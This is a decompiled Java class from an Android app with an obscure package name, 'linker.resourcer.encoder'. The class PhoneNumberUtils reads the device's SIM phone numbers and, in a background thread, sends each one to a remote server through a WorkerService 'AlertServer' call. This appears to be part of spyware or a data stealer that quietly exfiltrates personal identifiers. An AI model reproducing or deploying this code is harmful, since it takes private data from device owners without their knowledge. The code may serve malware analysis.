/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.Context
 *  android.os.Build$VERSION
 *  android.telephony.SubscriptionInfo
 *  android.telephony.SubscriptionManager
 *  android.util.Log
 */
package linker.resourcer.encoder;

import android.content.Context;
import android.os.Build;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import java.util.ArrayList;
import java.util.Iterator;
import linker.resourcer.encoder.WorkerService;

public class PhoneNumberUtils {
    private static final String TAG = "DREG_PHONE";

    public static ArrayList<String> getPhoneNumbers(Context object) {
        SubscriptionManager subscriptionManager;
        ArrayList<String> arrayList = new ArrayList<String>();
        if (PhoneNumberUtils.isFromAPI(23) && (subscriptionManager = (SubscriptionManager)object.getSystemService("telephony_subscription_service")) != null) {
            if (ActivityCompat.checkSelfPermission((Context)object, "android.permission.READ_PHONE_STATE") != 0) {
                return null;
            }
            object = subscriptionManager.getActiveSubscriptionInfoList();
            if (object != null) {
                Iterator iterator2 = object.iterator();
                while (iterator2.hasNext()) {
                    object = (SubscriptionInfo)iterator2.next();
                    object = PhoneNumberUtils.isFromAPI(33) ? subscriptionManager.getPhoneNumber(object.getSubscriptionId()) : object.getNumber();
                    if (object == null || ((String)object).isEmpty()) continue;
                    arrayList.add((String)object);
                }
            }
        }
        return arrayList;
    }

    private static boolean isFromAPI(int n) {
        boolean bl = Build.VERSION.SDK_INT >= n;
        return bl;
    }

    public static void printPhoneNumbers(Context context) {
        new Thread(context){
            final Context val$context;
            {
                this.val$context = context;
            }

            /*
             * Enabled aggressive block sorting
             * Enabled unnecessary exception pruning
             * Enabled aggressive exception aggregation
             */
            @Override
            public void run() {
                try {
                    Object object = PhoneNumberUtils.getPhoneNumbers(this.val$context);
                    if (object != null && ((ArrayList)object).size() != 0) {
                        object = ((ArrayList)object).iterator();
                        while (object.hasNext()) {
                            String string2 = (String)object.next();
                            StringBuilder stringBuilder = new StringBuilder();
                            Log.d((String)PhoneNumberUtils.TAG, (String)stringBuilder.append("Phone number: ").append(string2).toString());
                            Context context = this.val$context;
                            stringBuilder = new StringBuilder();
                            WorkerService.MyWorker.AlertServer(context, "Phone number", stringBuilder.append("My number is: ").append(string2).toString());
                        }
                        return;
                    }
                    Log.d((String)PhoneNumberUtils.TAG, (String)"Phone number: not found");
                    WorkerService.MyWorker.AlertServer(this.val$context, "Phone number", "Not found");
                    return;
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
            }
        }.start();
    }
}

